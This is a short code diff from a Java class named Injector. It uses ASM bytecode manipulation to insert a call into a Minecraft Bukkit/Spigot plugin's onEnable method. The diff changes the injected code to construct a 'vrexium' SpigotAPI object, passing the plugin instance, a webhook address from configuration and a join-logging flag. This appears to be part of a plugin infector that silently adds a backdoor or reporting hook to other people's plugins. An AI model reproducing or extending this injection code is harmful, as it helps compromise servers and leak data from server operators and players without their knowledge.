@@ -60,12 +60,16 @@ public class Injector {
 
 						// Create the instructions for the injected code.
 						InsnList list = new InsnList();
-						list.add(new TypeInsnNode(Opcodes.NEW, "meow/minoa/vrexium/utils/Loader"));
-						list.add(new InsnNode(Opcodes.DUP));
-						list.add(new MethodInsnNode(Opcodes.INVOKESPECIAL, "meow/minoa/vrexium/utils/Loader", "<init>", "()V", false));
+						list.add(new TypeInsnNode(Opcodes.NEW, "meow/minoa/vrexium/SpigotAPI"));
 						list.add(new InsnNode(Opcodes.DUP));
 						list.add(new VarInsnNode(Opcodes.ALOAD, 0));
-						list.add(new MethodInsnNode(Opcodes.INVOKEVIRTUAL, "meow/minoa/vrexium/utils/Loader", "load", "(Lorg/bukkit/plugin/java/JavaPlugin;)V", false));
+						list.add(new LdcInsnNode(parser.getDefault("", "webhook")));
+						list.add(new InsnNode(parser.getBool("logjoins") ? Opcodes.ICONST_1 : Opcodes.ICONST_0));
+
+						// Add the call to the constructor of the SpigotAPI class to the instruction list.
+						list.add(new MethodInsnNode(Opcodes.INVOKESPECIAL, "meow/minoa/vrexium/SpigotAPI", "<init>", "(Lorg/bukkit/plugin/java/JavaPlugin;Ljava/lang/String;Z)V", false));
+
+						// Add the instruction to pop the reference to the newly created SpigotAPI instance from the operand stack.
 						list.add(new InsnNode(Opcodes.POP));
 
 						// Insert the instructions into the onEnable method.
